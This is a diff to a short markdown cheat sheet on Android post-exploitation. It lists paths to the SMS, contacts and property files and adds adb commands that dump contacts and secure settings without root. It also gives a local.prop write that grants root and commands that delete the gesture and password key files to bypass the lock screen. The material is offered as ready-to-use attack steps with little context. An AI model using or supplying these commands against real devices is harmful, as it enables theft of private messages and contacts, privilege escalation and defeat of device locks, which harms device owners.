@@ -1,12 +1,20 @@
 # Android
 
-##Files to grab
+##Information Gathering
 
 ###Text Messages (Needs Root):
 
 ```
 /data/data/com.android.providers.telephony/databases/mmssms.db
 /data/data/com.android.providers/telephony/databases/mmssms.db
+```
+
+###Grab Contacts and Settings (does not need root):
+
+```
+adb shell content query --uri content://contacts/phones
+adb shell content query --uri content://settings/secure
+adb shell content query --uri content://settings/global
 ```
 
 ###Contacts (Needs Root):
@@ -36,15 +44,29 @@
 /data/local.prop
 ```
 
-If you can write to this file the following line will grant root:
-
-```
-echo "ro.kernel.qemu=1" > /data/local.prop
-```
-
 ###Device Settings:
 
 ```
 /system/build.prop
 ```
 
+##Misc.
+
+If you can write to this file the following line will grant root:
+
+```
+echo "ro.kernel.qemu=1" > /data/local.prop
+```
+
+Start an application via adb shell:
+
+```
+am start -a android.intent.activity.MAIN -n com.application.identifier/.ActivityID
+```
+
+Remove passcode lock (Need Root):
+
+```
+adb shell rm /data/system/gesture.key
+adb shell rm /data/system/password.key
+```
